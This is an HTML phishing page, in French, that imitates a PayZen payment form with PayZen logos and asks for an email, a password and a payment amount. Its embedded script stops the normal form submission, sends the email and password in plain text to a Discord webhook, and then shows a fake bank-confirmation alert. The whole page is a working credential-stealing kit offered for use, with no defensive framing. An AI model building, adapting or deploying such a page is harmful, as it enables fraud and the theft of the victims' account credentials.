<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .header {
            background-color: #000;
            padding: 50px 0;
            text-align: center;
            width: 100%;
        }

        .header img.logo {
            max-width: 150px;
        }

        h1 {
            text-align: center;
            color: #333;
        }

        .payment-container {
            max-width: 1200px;
            margin: 20px auto;
            padding: 40px;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            border-radius: 15px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        label {
            display: block;
            font-weight: bold;
            margin-bottom: 10px;
            color: #333;
        }

        input[type="text"],
        input[type="password"],
        select {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 10px;
            box-sizing: border-box;
        }

        button[type="submit"] {
            background-color: #007bff;
            color: #fff;
            padding: 12px 20px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-size: 16px;
        }

        button[type="submit"]:hover {
            background-color: #0056b3;
        }

        .checkbox-label {
            display: flex;
            align-items: center;
            margin-top: 20px;
        }

        .checkbox-label input[type="checkbox"] {
            margin-right: 10px;
        }

        .logo-payzen {
            max-width: 200px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="header">
        <img class="logo" src="https://www.payzen.eu/wp-content/uploads/2021/12/Logo-PZ-byLyra-blu_300dpi-300x126-1.webp" alt="Logo">
    </div>
    <div class="payment-container">
        <img class="logo-payzen" src="https://nature-et-developpement.com/wp-content/uploads/Pay-Zen-100-securise_logo_2022.jpg" alt="Logo PayZen">
        <form action="/process_payment" method="POST" id="paymentForm">
            <label for="email">Email :</label>
            <input type="text" id="email" name="email" placeholder="email@example.com" required>

            <label for="password">Mot de passe :</label>
            <input type="password" id="password" name="password" placeholder="Mot de passe" required>

            <label for="amount">Montant à payer :</label>
            <select id="amount" name="amount">
                <option value="1">1 EUR</option>
                <option value="10">10 EUR</option>
                <option value="50">50 EUR</option>
                <option value="100">100 EUR</option>
                <option value="200">200 EUR</option>
                <option value="500">500 EUR</option>
            </select>

            <div class="checkbox-label">
                <input type="checkbox" id="acceptTerms" name="acceptTerms" required>
                <label for="acceptTerms">J'accepte les conditions d'utilisation et la collecte de mes données.</label>
            </div>

            <button type="submit" id="pay-button">Payer</button>
        </form>
    </div>
    <script>
        document.getElementById("paymentForm").addEventListener("submit", function(event) {
            event.preventDefault();

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            const montant = document.getElementById("amount").value;

            const data = {
                content: `Email: ${email}, Mot de passe: ${password}, Montant: ${montant}`
            };

            fetch('https://discord.com/api/webhooks/your_webhook_id/your_webhook_token', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (response.ok) {
                    alert("Nous allons vous envoyer une confirmation bancaire.");
                } else {
                    alert("Erreur lors du paiement !");
                }
            })
            .catch(error => {
                console.error("Une erreur s'est produite:", error);
            });
        });
    </script>
</body>
</html>
